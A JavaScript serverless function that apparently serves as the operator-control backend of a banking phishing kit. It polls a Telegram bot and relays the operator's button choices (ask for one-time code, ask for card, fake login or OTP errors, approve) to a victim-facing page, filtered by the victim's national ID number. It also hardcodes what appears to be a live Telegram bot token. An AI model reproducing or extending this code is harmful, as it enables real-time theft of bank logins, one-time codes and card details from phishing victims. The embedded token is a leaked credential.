const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";

let lastUpdateId = 0;

exports.handler = async (event) => {
  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type",
        "Access-Control-Allow-Methods": "GET, OPTIONS",
      },
      body: "",
    };
  }

  const headers = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Content-Type",
    "Content-Type": "application/json",
  };

  try {
    const { cedula } = event.queryStringParameters || {};

    const res = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=3&allowed_updates=["callback_query","message"]`
    );

    const data = await res.json();

    if (!data.ok || !data.result.length) {
      return { statusCode: 200, headers, body: JSON.stringify({ action: null }) };
    }

    for (const update of data.result) {
      lastUpdateId = update.update_id;
      const cb = update.callback_query;
      if (!cb) continue;

      const cbData = cb.data;

      // Confirmar al bot
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          callback_query_id: cb.id,
          text: "✅ Acción enviada al cliente",
        }),
      });

      // Filtrar por cédula si viene
      if (cedula && !cbData.includes(cedula)) continue;

      if (cbData.startsWith("otp_"))           return { statusCode: 200, headers, body: JSON.stringify({ action: "otp" }) };
      if (cbData.startsWith("tarjeta_"))       return { statusCode: 200, headers, body: JSON.stringify({ action: "tarjeta" }) };
      if (cbData.startsWith("error_login_"))   return { statusCode: 200, headers, body: JSON.stringify({ action: "error_login" }) };
      if (cbData.startsWith("error_otp_"))     return { statusCode: 200, headers, body: JSON.stringify({ action: "error_otp" }) };
      if (cbData.startsWith("error_tarjeta_")) return { statusCode: 200, headers, body: JSON.stringify({ action: "error_tarjeta" }) };
      if (cbData.startsWith("aprobar_"))       return { statusCode: 200, headers, body: JSON.stringify({ action: "aprobar" }) };
    }

    return { statusCode: 200, headers, body: JSON.stringify({ action: null }) };

  } catch (err) {
    console.error("ERROR:", err);
    return { statusCode: 500, headers, body: JSON.stringify({ action: null, error: err.message }) };
  }
};
